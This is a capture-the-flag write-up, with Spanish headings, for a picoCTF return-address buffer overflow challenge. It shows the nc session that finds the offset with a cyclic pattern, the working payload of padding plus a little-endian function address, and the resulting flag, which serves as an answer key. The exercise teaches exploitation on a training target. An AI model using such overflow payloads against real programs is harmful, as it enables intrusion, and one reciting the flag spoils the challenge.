## Descripcipción

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 51087`
## Pistas

(None)
## Solucion

```
┌──(kali㉿kali)-[~/Documents/otros]
└─$ nc saturn.picoctf.net 63904
Please enter your string: 
sdjhkajshfkjdahfdfajhf ahafklahfd
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/otros]
└─$ echo'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | nc saturn.picoctf.net 63904
echoaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa: command not found

^C
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/otros]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | nc saturn.picoctf.net 63904
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/otros]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 63904
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}
```

## Bandera
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}

